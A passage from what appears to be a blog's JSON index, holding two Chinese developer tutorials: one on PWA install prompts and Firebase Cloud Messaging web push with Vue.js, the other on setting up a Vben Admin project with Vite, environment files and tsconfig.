\u0026amp;\u0026amp; installPromptEvent.prompt) { // 延遲一段時間才顯示 prompt setTimeout(function() { // 如果 Chrome 版本是 67（含）以下，可以直接呼叫 if (version \u0026lt;= 67) { installPromptEvent.prompt() return } // 否則的話必須透過 user action 主動觸發 // 這邊幫 #root 加上 event listener，代表點擊螢幕任何一處都會顯示 prompt document.querySelector(\u0026#39;#root\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) }, showTime) } }); function addToHomeScreen(e) { if (installPromptEvent) { installPromptEvent.prompt() installPromptEvent = null document.querySelector(\u0026#39;#root\u0026#39;).removeEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) } } 如果是 67 以下，直接呼叫就可以顯示 prompt，否則的話還要再一步，要加個 event listener 才行，而我們也選擇延遲 30 秒才顯示。\n出乎意料地，這樣一個小改動帶來驚人的成長，原本一天大概才 20、30 個人安裝 PWA，經過這樣調整之後瞬間變成八到十倍，看到 GA 的那個統計圖我也嚇了一跳，沒想到效果這麼好。\n與其一直積極地要別人快點安裝 PWA，還不如只要求真的對你產品有興趣（停留超過 30 秒鐘）的人。\n用 Firebase 做 Web Push 用到的資源 Web Push 推播功能，這陣子很常看到的一個功能，如果一進入網站，看到網站要求顯示通知的權限，就代表這個網站有用這功能：\n那通常，很多網站 UX 設計不良，在使用者根本就還搞不清楚這網站是幹麻的情況下就跳通知，所以大部份都直接按封鎖了吧 XD？\n總之，在踩了幾個坑以後，終於完整的寫出了 Web Push 的功能。\n完整是指會在桌機、安卓手機發出推播通知，並且點了會進到指定的頁面，同時在 Firebase 儲存發送訊息的記錄。\n用到的資源如下：\n資料庫：Firebase Realtime Database 推播功能：Firebase Cloud Messaging JS framework：Vue.js Web Push 是 PWA 一個很重要的功能！\n取得 FCM 金鑰 本篇是用 Firebase 的 Cloud Messaging功能（以下稱 FCM），去實作 Web Push。所以第一步是要先在 Firebase 上開一個專案。\n以下截圖所用到的 Firebase 專案之後會刪掉，各種金鑰最後都不會存在，純示範用。\n開完專案後，要取得推播金鑰，有了金鑰才能始用 FCM 的功能。\n首先進到 Firebase 後台，點選齒輪後，再點選專案設定：\n點擊 Cloud Messaging：\n頁面往下拉，會看到一個「網路設定」的區塊，有一個「產生金鑰組」的按金，按下去：\n就會產生一組 Web Push 用的金鑰，先存下來，Firebase Config 裡會用到：\n新增 manifest.json、Firebase Config 取得金鑰後，第二步就是新增一個 manifest.json 的檔案，檔案內容大概如下：\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 { \u0026#34;short_name\u0026#34;: \u0026#34;XXX\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;XXXXXX\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo192.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;./logo/logo512.png\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./logo/maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#000000\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } 最重要的是這一行：\n1 \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; 這行一定要有，key、value 是固定的，copy 貼上就行。\nFirebase Config 建立一個首頁的檔案 index.html，在頁尾的部份引用 Firebase Config。\nFirebase Config 一樣是後台有提供，點小齒輪，再點專案設定後，接著點代表 Web 的那個按鈕：\n就會出現 Config 了：\ncopy 以後貼到 index.html，另外也一併貼上 FCM 的引用，整合後如下：\nfcm-web-push-firebase-config.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script src=\u0026#34;https://www.gstatic.com/firebasejs/5.9.1/firebase.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var database = firebase.database(); var messaging = firebase.messaging(); messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); \u0026lt;/script\u0026gt; 最後一行的：\n1 messaging.usePublicVapidKey(\u0026#39;XXXXXXXXXXXXXXXXXXXX\u0026#39;); XXX 就是要替換成第一步拿到的 FCM 金鑰。\n取得使用者的 token 簡單來說，Web Push 推播功能的流程如下：\n註冊 service-worker → 向使用者要求允許通知權限 → FCM 產生這個裝置的 token → token 寫進資料庫 → 從後台使用 Web Push → Server 發 Web Push 到裝置上 → 裝置上的 service worker 接收 → service worker 執行 notification token 是每一個裝置會有的，之所以會以裝置為單位，而不是以使用者為單位，是因為每一個裝置都可以註冊service worker，而且每次存的 token 都會不同，所以一個使用者在桌機的 Chrome、Fireox，或是安卓手機的Chrome、Firefox，都有不同的 token。\n假設王小明在桌機的 Chrome、Firefox，都按下了允許通知，在安卓手機的 Chrome、Firefox 也按了允許通知，那當我們按下發送推播後，王小明就會在 4 個地方收到相同的通知。因為是用裝置來區分的。\nIOS 目前還不支援 Web Push。\n2020.04.10更新：\n今天看到 iZooto 的 一篇文章 上寫，在比對了一下 Can I Use 中的 service workers 支援情況，可以看到 IOS11.3 開始支援 Service Workers 了，但 Web Push 的功能只支援在 MAC，尚未支援到 iPhone 上。\n新增 sw.js 用 Workbox 新增一個 sw.js 檔案，把 Firebase 的 Config 放進去，程式碼如下：\nfcm-web-push-sw1.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 importScripts(\u0026#34;https://storage.googleapis.com/workbox-cdn/releases/3.6.3/workbox-sw.js\u0026#34;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-app.js\u0026#39;); importScripts(\u0026#39;https://www.gstatic.com/firebasejs/5.7.0/firebase-messaging.js\u0026#39;); workbox.clientsClaim(); workbox.skipWaiting(); workbox.precaching.precacheAndRoute([ // 要快取的檔案 ]); // firebase config var config = { apiKey: \u0026#34;XXXXXXXXXX\u0026#34;, authDomain: \u0026#34;XXXXXXXXXX.firebaseapp.com\u0026#34;, databaseURL: \u0026#34;https://XXXXXXXXXX.firebaseio.com\u0026#34;, projectId: \u0026#34;XXXXXXXXXX\u0026#34;, storageBucket: \u0026#34;XXXXXXXXXX.appspot.com\u0026#34;, messagingSenderId: \u0026#34;XXXXXXXXXX\u0026#34; }; firebase.initializeApp(config); var messaging = firebase.messaging(); 如果推播裡要放公司的 Logo，那 Logo 的圖檔就要寫進快取檔案的清單裡，到時推播才有圖檔可以顯示。\n註冊 sw.js、存 Cookies、存 Firebase 如果拿到的 token 不存在 Cookies 裡，用 Cookies 判斷是否拿過 token，那使用者就會存到 2 組以上的 token，在發推播時，就會收到相同的訊息多次。\n當然，如果使用者清除了快取，就會有別種情況發生，最好的方式還是讓使用者登入會員後，再取得 token，把 token 跟會員綁一起，就不會有奇奇怪怪的情形出現。\n以下為 JS code：\nfcm-web-push-get-token.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 window.addEventListener(\u0026#39;load\u0026#39;, function() { if(\u0026#39;serviceWorker\u0026#39; in navigator) { navigator.serviceWorker.register(\u0026#39;/sw.js\u0026#39;) .then(function(reg) { // firebase methods，用同一支sw.js messaging.useServiceWorker(reg); }) // 註冊失敗 .catch(function(err) { console.log(\u0026#39;error: \u0026#39;, err); }); } messaging.requestPermission().then(function() { // 先判斷cookies有沒有token，沒有再取token var ckv = document.cookie.replace(/(?:(?:^|.*;\\\\s*)augustusWsPush\\s*\\=\\s*([^;]*).*$)|^.*$/, \u0026#34;$1\u0026#34;) || null; // cookies不存在，跟使用者要求通知權限 if(ckv === null) { // 拿到token，firebase-messaging-sw.js 就會存 Service Workers 裡 messaging.getToken().then(function(currentToken) { // token存至firebase var id = currentToken.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: currentToken}); // token存至cookies document.cookie = \u0026#34;augustusWsPush=\u0026#34; + currentToken; }); } // cookies 已存在，從 cookies 取出後傳至 firebase else { var id = ckv.split(\u0026#39;:\u0026#39;)[0]; firebase.database().ref(\u0026#39;pushUsers/\u0026#39; + id).set({\u0026#39;token\u0026#39;: ckv}); } }).catch(function(err) { console.log(\u0026#39;使用者未允許通知\u0026#39;, err); }); }); 裡面有一行很重要：\n1 messaging.useServiceWorker(xxx); 這是這次踩到的坑。\n如果沒寫這行，就會發現網站存了 2 個 service worker，分別是 Firebase 的，以及我們自己的。這行可以讓 FCM 只存我們註冊的 sw.js，才可以在用 FCM 推播時，順利的執行推播及點擊後開啟指定的頁面。\n成功的話，開啟 index.html，在開發人員工具的 Application → Service Workers，就會看見註冊了 sw.js 檔案：\n註冊 sw.js 只能在 https 下，因此網域必須有S SL，不然會註冊失敗。\n1 messaging.requestPermission() 這行會跟使用者要允許通知，使用者按下允許後\n1 messaging.requestPermission() 這行就會產生 FCM 的 token，之後就是存進 Firebase 跟 Cookies。\nFirebase 上會看到以下：\n之後只要跑個迴圈，就可以一個個去發送 Web Push。\n發送 Web Push 這邊新增一個 admin.html 來當做發送 Web Push 的後台介面，直接用 Vue.js 抓每個 input 的值。\nWeb Push 如果要判斷成效，直接用 Google Analytics 的 utm 參數就可以了，所以後台欄位有給 utm 用的 3 個主要參數。\n不含樣式的原始碼文末會附上 GitHub 網址。\n在發送 Web Push 時，還要填入伺服器的金鑰，這也是從 Firebase 後台可以拿到。點小齒輪 → 專案設定 → Cloud Messaging，第一個「伺服器金鑰」的值就是了：\n發送 Web Push 的 JS 如下，寫在 admin.html 裡：\nfcm-web-push-trigger.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var notification = { \u0026#39;title\u0026#39;: \u0026#39;web push標題\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;web push內文\u0026#39;, \u0026#39;badge\u0026#39;: \u0026#39;logo圖檔路徑\u0026#39;, \u0026#39;icon\u0026#39;: \u0026#39;logo圖檔路徑\u0026#39;, \u0026#39;click_action\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39;, \u0026#39;data\u0026#39;: { \u0026#39;url\u0026#39;: \u0026#39;https://www.domain.com.tw\u0026#39; } }; fetch(\u0026#39;https://fcm.googleapis.com/fcm/send\u0026#39;, { \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;headers\u0026#39;: { \u0026#39;Authorization\u0026#39;: \u0026#39;key=從firebase上取得伺服器金鑰\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, \u0026#39;body\u0026#39;: JSON.stringify({ \u0026#39;data\u0026#39;: notification, \u0026#39;to\u0026#39;: \u0026#39;使用者的token\u0026#39;, }) }).then(function(response) { console.log(response); }).catch(function(error) { alert(error); }); 接收 Web Push 接受 Web Push 有 2 種情況：\n使用者正開啟官網頁面 使用者沒有開啟官網頁面 第一種情況，是在 index.js 下寫一個 messaging.onMessage 的 function 處理。\n第二種情況，是在 sw.js 下寫一個 messaging.setBackgroundMessageHandler 的 function 處理。\n使用者正開啟官網頁面 官網正開啟的狀況下，屬於 JS 的 notification 功能，function 範例如下：\nfcm-web-push-notification.js 1 2 3 4 5 6 7 8 9 10 11 messaging.onMessage(function(payload) { var msgTitle = payload.data.title; var url = payload.data.click_action; var notification = new Notification(msgTitle, payload.data); // 點擊推播後要連去哪 notification.addEventListener(\u0026#39;click\u0026#39;, function() { e.preventDefault(); location.href = url; }); }); payload 就是傳來的值，點擊後要導到的頁面就用 location.href 來處理。\n使用者沒有開啟官網頁面 使用者在上網，但沒有開啟官網的頁面，就是由之前註冊的 sw.js 處理，在 sw.js 加入以下：\nfcm-web-push-sw2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var click_action; // 監聽notifiction點擊事件 self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var url = click_action; event.notification.close(); event.waitUntil( clients.matchAll({ type: \u0026#39;window\u0026#39; }).then(windowClients =\u0026gt; { // 如果tab是開著的，就 focus 這個tab for (var i = 0; i \u0026lt; windowClients.length; i++) { var client = windowClients[i]; if(client.url === url \u0026amp;\u0026amp; \u0026#39;focus\u0026#39; in client) { return client.focus(); } } // 如果沒有，就新增tab if(clients.openWindow) { return clients.openWindow(click_action); } }) ); }); // FCM messaging.setBackgroundMessageHandler(function(payload) { var data = payload.data; var title = data.title; var options = { body: data.body, icon: \u0026#39;/logo/logo192.png\u0026#39;, badge: \u0026#39;/logo/logo192.png\u0026#39; }; click_action = data.click_action; return self.registration.showNotification(title, options); }); click_action 是點擊後要開啟的頁面網址，但要另外寫一個 notificationclick 來處理。\n這邊踩了一個坑，如果按照一般順序來寫，會先寫了 messaging.setBackgroundMessageHandler 後，再寫 notificationclick。然後就會發現，Chrome 上可以正常運作，但在 Firefox 上怎麼點就是不會開啟頁面。\nGoogle 了很久，才看到這篇：service worker notificationclick event doesn’t focus or open my website in tab\nclick_action 是 Chrome 用的，如果 messaging.setBackgroundMessageHandler 先寫了，那 FCM 就會全部接收 Web Push 的功能，就不會讓原生的 notificationclick 事件被運作，因此 notificationclick 得寫在前，讓原生事件運作後，再執行 FCM 的事件。\n補充資源 有了發送、接收，基本上 Web Push 就可以順利運作了。\n要注意的是 Web Push 只接受在 https 以下運行。\n最後附上學習時參考的教學文，以及本篇的 GitHub 原始碼。\n從建 Firebase 就開始教學的（英文）：Tutorial: Web Push notification using Firebase\n建立 Service Worker Web Push Notification — (Firebase Push Notification實作紀錄)\nPush Notification之成為訂閱用戶(Firebase實作)\nGoogle 官方教學的原始碼：GitHub\nGoogle 官方教學的功能示範：Notification Examples\n","date":"2022-10-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52438994804_33f71b7e35_o.jpg","permalink":"https://wayneblog.ga/2022-10-19/web-pwa/","title":"將網頁變成Progressive Web Application(PWA)，漸進式的網頁應用程式"},{"content":" 參考網站\n參考網站\n這是一篇完整的 2022 年連結優化指南。\n因此，如果你想要取得權威網站的反向連結。\n你將會在這篇新指南中，享受本文可操作的技巧。\n讓我們往深入其中吧。\nVben Admin 點我跳過 Vben Admin，直接前往配置Vite\n介紹 Vue-Vben-Admin 是一個基於 Vue3.0、Vite、Ant-Design-Vue、TypeScript 的後台解決方案，目標是為開發中大型項目提供開箱即用的解決方案。包括二次封裝組件、utils、hooks、動態菜單、權限校驗、按鈕級別權限控制等功能。項目會使用前端較新的技術棧，可以作為項目的啟動模版，以幫助你快速搭建企業級中後台產品原型。也可以作為一個示例，用於學習 vue3、vite、ts 等主流技術。該項目會持續跟進最新技術，並將其應用在項目中。\n文檔 中文文檔地址為 vben-admin-doc，採用 Vitepress 開發。 本地運行文檔 如需本地運行文檔，請拉取代碼到本地。\n1 2 3 4 5 6 7 8 # 拉取代碼 git clone https://github.com/vbenjs/vue-vben-admin-doc # 安裝依賴 yarn # 運行項目 yarn dev 需要掌握的基礎知識 本項目需要一定前端基礎知識，請確保掌握Vue 的基礎知識，以便能處理一些常見的問題。建議在開發前先學一下以下內容，提前了解和學習這些知識，會對項目理解非常有幫助：\nVue3 文檔 Vue-RFCS Vue2 遷移到 3 TypeScript Vue-router Ant-Design-Vue ES6 Vitejs WindiCss 模版 vue-vben-admin (完整版演示) vue-vben-admin 完整版本。該版本主要是提供一些Demo示例及插件的使用集成方式，主要用於參考。如果對項目不是很熟悉，不建議在此基礎上進行開發，請使用下方提供的精簡版本。\nvue-vben-admin-thin (精簡版演示) vue-vben-admin 精簡版本。刪除了相關示例、無用文件及功能、依賴。可以根據自身需求安裝對應的依賴。因為使用的是 vite，依賴刪除不會導致相關組件或者 hook 發出警告。只在需要的時候安裝對應的庫即可。\nvite 插件推薦 vite-plugin-mock - 用於本地及開發環境數據 mock\nvite-plugin-html - 用於 html 模版轉換，可以在html文件內進行書寫模版語法\nvite-plugin-style-import - 用於組件庫樣式按需引入\nvite-plugin-imagemin - 用於打包壓縮圖片資源\nvite-plugin-theme - 用於在線切換主題色/黑暗主題適配等主題相關配置\nvite-plugin-compression - 用於打包輸出.gz|.br文件\nvite-plugin-svg-icons - 快速生成 svg sprite\n瀏覽器支持 本地開發推薦使用Chrome 最新版瀏覽器，不支持Chrome 80以下版本。\n生產環境支持現代瀏覽器，不支持IE。\n創建VbenLearn項目 使用Vite創建項目 vite官方文檔\n1 2 3 4 5 6 7 8 # 官網上的創建項目命令 yarn create @vitejs/app # 名稱 vben-learn # vue-ts的模板 √ vue-ts yarn報錯 文件名、目錄名或卷標語法不正確。報錯，參考鏈接\n安裝 vscode 插件 安裝插件 VbenAdmin 官方推荐\nIconify IntelliSense：Iconify 圖標插件 WndiCSS lntelliSense：windicss 提示插件 i18n Ally： i18n 插件 Vetur：vue 開發必備 （也可以選擇 Volar） ESLint：腳本代碼檢查 Prettier - Code formatter：代碼格式化 Stylelint：css 格式化 DotENV： .env 文件 高亮 獲取 Vben Admin 從 GitHub 獲取代碼 1 git clone https://github.com/vbenjs/vue-vben-admin.git 從 Gitee 獲取代碼 1 git clone https://gitee.com/annsion/vue-vben-admin.git 注意\nGitee 的代碼可能不是最新的\nimagemin 依賴安裝失敗解決方法 由於 imagemin 在國內安裝困難，提供以下幾個解決方案：\n使用 yarn 在 package.json 內配置(推薦，項目內已集成，前提是必須使用 yarn) package.json 1 2 3 4 5 // ... \u0026#34;resolutions\u0026#34;: { \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; } // ... 使用 npm，在電腦 host 文件加上如下配置即可 etc/hosts 1 199.232.4.133 raw.githubusercontent.com npm script package.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // ... \u0026#34;scripts\u0026#34;: { # 安裝依賴 \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, # 運行項目 \u0026#34;serve\u0026#34;: \u0026#34;npm run dev\u0026#34;, # 運行項目 \u0026#34;dev\u0026#34;: \u0026#34;vite\u0026#34;, # 構建項目 \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, # 清空緩存後構建項目 \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, # 生成打包分析，在 `Mac OS` 電腦上執行完成後會自動打開界面，在 `Window` 電腦上執行完成後需要打開 `./build/.cache/stats.html` 查看 \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34;, # 類型檢查 \u0026#34;type:check\u0026#34;: \u0026#34;vue-tsc --noEmit --skipLibCheck\u0026#34;, # 預覽打包後的內容（先打包在進行預覽） \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, # 直接預覽本地 dist 文件目錄 \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, # 生成 ChangeLog \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, # 刪除緩存 \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, # 刪除 node_modules (`window` 系統手動刪除該目錄較慢，可以使用該命令來進行刪除) \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, # 執行 eslint 校驗，並修復部分問題 \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, # 執行 prettier 格式化（該命令會對項目所有代碼進行 prettier 格式化，請謹慎執行） \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, # 執行 stylelint 格式化 \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, # 對打包結果進行 gzip 測試 \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, # 對打包目錄進行 brotli 測試 \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, # 重新安裝依賴，見下方說明 \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, # 生成圖標集，見下方說明 \u0026#34;gen:icon\u0026#34;: \u0026#34;esno ./build/generate/icon/index.ts\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... 目錄說明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 . ├── build # 打包腳本相關 │ ├── config # 配置文件 │ ├── generate # 生成器 │ ├── script # 腳本 │ └── vite # vite配置 ├── mock # mock文件夾 ├── public # 公共靜態資源目錄 ├── src # 主目錄 │ ├── api # 接口文件 │ ├── assets # 資源文件 │ │ ├── icons # icon sprite 圖標文件夾 │ │ ├── images # 項目存放圖片的文件夾 │ │ └── svg # 項目存放svg圖片的文件夾 │ ├── components # 公共組件 │ ├── design # 樣式文件 │ ├── directives # 指令 │ ├── enums # 枚舉/常量 │ ├── hooks # hook │ │ ├── component # 組件相關hook │ │ ├── core # 基礎hook │ │ ├── event # 事件相關hook │ │ ├── setting # 配置相關hook │ │ └── web # web相關hook │ ├── layouts # 佈局文件 │ │ ├── default # 默認佈局 │ │ ├── iframe # iframe佈局 │ │ └── page # 頁面佈局 │ ├── locales # 多語言 │ ├── logics # 邏輯 │ ├── main.ts # 主入口 │ ├── router # 路由配置 │ ├── settings # 項目配置 │ │ ├── componentSetting.ts # 組件配置 │ │ ├── designSetting.ts # 樣式配置 │ │ ├── encryptionSetting.ts # 加密配置 │ │ ├── localeSetting.ts # 多語言配置 │ │ ├── projectSetting.ts # 項目配置 │ │ └── siteSetting.ts # 站點配置 │ ├── store # 數據倉庫 │ ├── utils # 工具類 │ └── views # 頁面 ├── test # 測試 │ └── server # 測試用到的服務 │ ├── api # 測試服務器 │ ├── upload # 測試上傳服務器 │ └── websocket # 測試ws服務器 ├── types # 類型文件 ├── vite.config.ts # vite配置文件 └── windi.config.ts # windcss配置文件 Vite配置多環境 說明： 就好像之前在Vue-Cli中的env一樣。\nVite官網說明\nVbenAdmin官方說明\n項目的環境變量配置位於項目根目錄下的 .env、.env.development、.env.production\n1 2 3 4 .env # 在所有的環境中被載入 .env.local # 在所有的環境中被載入，但會被 git 忽略 .env.[mode] # 只在指定的模式中被載入 .env.[mode].local # 只在指定的模式中被載入，但會被 git 忽略 創建默認配置文件 根目錄下創建：.env文件 1 2 3 4 5 6 7 8 # 運行的端口 VITE_PORT = 3100 # 應用名稱 VITE_GLOB_APP_TITLE = Vben Admin # 應用短名稱 VITE_GLOB_APP_SHORT_NAME = vue_vben_admin 創建生產配置文件 根目錄下創建：.env.production文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 是否使用mock VITE_USE_MOCK = true # 公共路徑 VITE_PUBLIC_PATH = / # 是否刪除所有日誌打印 VITE_DROP_CONSOLE = true # 是否啟用gzip或brotli壓縮。 # 可選：gzip | brotli | none # 如果你需要多個表格，你可以使用`,`來分隔。 VITE_BUILD_COMPRESS = \u0026#39;none\u0026#39; # 應用基本接口地址 VITE_GLOB_API_URL=/api # 文件上傳地址，可選 # 可以通過nginx轉發或直接寫入實際地址。 VITE_GLOB_UPLOAD_URL=/upload # 接口前綴 VITE_GLOB_API_URL_PREFIX= # 是否啟用圖像壓縮 VITE_USE_IMAGEMIN= true #使用PWA VITE_USE_PWA = false # 是否與舊版瀏覽器兼容 VITE_LEGACY = false 創建開發配置文件 根目錄下創建：.env.development文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 VITE_PORT = 3100 # 是否使用mock VITE_USE_MOCK = true # 公共路徑 VITE_PUBLIC_PATH = / # 跨域代理，你可以配置多個代理。 VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;http://localhost:3000\u0026#34;],[\u0026#34;/upload\u0026#34;,\u0026#34;http://localhost:3001/upload\u0026#34;]] # VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;https://vvbin.cn/test\u0026#34;]] # 是否刪除所有日誌打印 VITE_DROP_CONSOLE = false # 應用基本接口地址 VITE_GLOB_API_URL=/api # 文件上傳地址，可選 VITE_GLOB_UPLOAD_URL=/upload # 接口前綴 VITE_GLOB_API_URL_PREFIX= 測試配置 src\\App.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{ vitePort }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineComponent, ref } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;App\u0026#34;, setup() { const vitePort = ref(import.meta.env.VITE_PORT); return { vitePort, }; }, }); \u0026lt;/script\u0026gt; 生產環境動態配置，可參考 Vben Admin 官方說明\n配置TS 說明 我們使用Vite創建的項目時使用的是vue-ts模板，所以在創建項目的時候package.json就自帶了typescript。該依賴會編譯我們的ts文件。那麼是依賴我們就可以配置它。配置內容還是照搬Vben的，加上註釋和規則來源。\n官方文檔-tsconfig.json文件 官方文檔-TS編譯選項 你不知道的 tsconfig.json 參考鏈接 創建配置文件 根目錄下創建：tsconfig.json文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 { \u0026#34;compilerOptions\u0026#34;: { // ↓ 指定ECMAScript目標版本，esnext為最新版本 \u0026#34;target\u0026#34;: \u0026#34;esnext\u0026#34;, // ↓ 指定生成哪個模塊系統代碼，esnext為最新版本 \u0026#34;module\u0026#34;: \u0026#34;esnext\u0026#34;, // ↓ 決定如何處理模塊。 \u0026#34;moduleResolution\u0026#34;: \u0026#34;node\u0026#34;, // ↓ 啟用所有嚴格類型檢查選項。 \u0026#34;strict\u0026#34;: true, // ↓ 禁止對同一個文件的不一致的引用。 \u0026#34;forceConsistentCasingInFileNames\u0026#34;: true, // ↓ 允許從沒有設置默認導出的模塊中默認導入。這並不影響代碼的輸出，僅為了類型檢查。 \u0026#34;allowSyntheticDefaultImports\u0026#34;: true, // ↓ 禁用函數參數雙向協變檢查。 \u0026#34;strictFunctionTypes\u0026#34;: false, // ↓ 在 .tsx文件裡支持JSX \u0026#34;jsx\u0026#34;: \u0026#34;preserve\u0026#34;, // ↓ 解析非相對模塊名的基準目錄。查看 模塊解析文檔了解詳情。 \u0026#34;baseUrl\u0026#34;: \u0026#34;.\u0026#34;, // ↓ 允許編譯javascript文件。 \u0026#34;allowJs\u0026#34;: true, // ↓ 生成相應的 .map文件。 \u0026#34;sourceMap\u0026#34;: true, \u0026#34;esModuleInterop\u0026#34;: true, \u0026#34;resolveJsonModule\u0026#34;: true, // ↓ 若有未使用的局部變量則拋錯。 \u0026#34;noUnusedLocals\u0026#34;: true, // ↓ 若有未使用的參數則拋錯。 \u0026#34;noUnusedParameters\u0026#34;: true, // ↓ 啟用實驗性的ES裝飾器。 \u0026#34;experimentalDecorators\u0026#34;: true, // ↓ 編譯過程中需要引入的庫文件的列表。 